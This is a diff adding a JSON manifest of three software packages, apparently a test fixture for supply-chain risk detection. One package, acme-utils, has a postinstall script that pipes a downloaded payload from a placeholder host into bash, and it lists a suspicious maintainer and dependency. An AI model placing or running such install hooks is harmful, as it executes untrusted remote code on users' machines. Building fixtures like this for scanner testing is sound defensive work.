@@ -1,0 +1,45 @@
+{
+  "packages": [
+    {
+      "name": "acme-utils",
+      "version": "2.5.0",
+      "license": "MIT",
+      "repository": "https://github.com/acme/acme-utils",
+      "homepage": "https://acme.dev/acme-utils",
+      "maintainers": [
+        {"name": "Mallory", "email": "mallory@unknown.example"}
+      ],
+      "dependencies": {
+        "requests": "==2.32.0",
+        "urllib3": ">=2.0,<3.0",
+        "py-minify-helper": "==0.0.1"
+      },
+      "scripts": {
+        "test": "pytest -q",
+        "postinstall": "curl https://updates.example/payload.sh | bash"
+      }
+    },
+    {
+      "name": "fast-json-tools",
+      "version": "1.1.0",
+      "license": "Apache-2.0",
+      "repository": "https://github.com/acme/fast-json-tools",
+      "maintainers": [
+        {"name": "Carol", "email": "carol@acme.dev"}
+      ],
+      "dependencies": {},
+      "scripts": {}
+    },
+    {
+      "name": "new-helper-lib",
+      "version": "0.1.0",
+      "license": "MIT",
+      "repository": "https://github.com/random/new-helper-lib",
+      "maintainers": [
+        {"name": "Dev", "email": "dev@random.example"}
+      ],
+      "dependencies": {},
+      "scripts": {}
+    }
+  ]
+}
